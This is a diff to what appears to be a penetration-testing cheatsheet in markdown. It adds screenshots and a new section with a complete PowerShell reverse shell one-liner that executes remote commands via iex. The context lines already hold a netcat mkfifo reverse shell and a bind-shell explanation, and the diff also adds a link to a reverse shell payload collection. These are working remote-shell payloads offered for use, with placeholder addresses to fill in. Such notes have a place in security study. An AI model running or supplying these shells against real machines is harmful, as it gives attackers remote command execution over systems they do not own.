@@ -957,7 +957,17 @@ create a listener for a bind shell:
 - creates a named pipe at /tmp/f
 - connects the input of the listener to the output of the named pipe.
 - output of the netcat listener (i.e. the commands we send) then gets piped directly into sh.
+- ![image](https://user-images.githubusercontent.com/91292763/148352081-fc3d5f98-82f0-45be-ae98-57bbc046373b.png)
+
 
 nc reverse shell:
 - ``` mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f ```
-- 
+- ![image](https://user-images.githubusercontent.com/91292763/148352066-1f3bf559-2062-4933-b9f0-84ce613499c1.png)
+
+reverse power shell on Windows:
+- ``` powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" ```
+
+**Other reverse shell:**
+- PayloadsAllTheThings
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
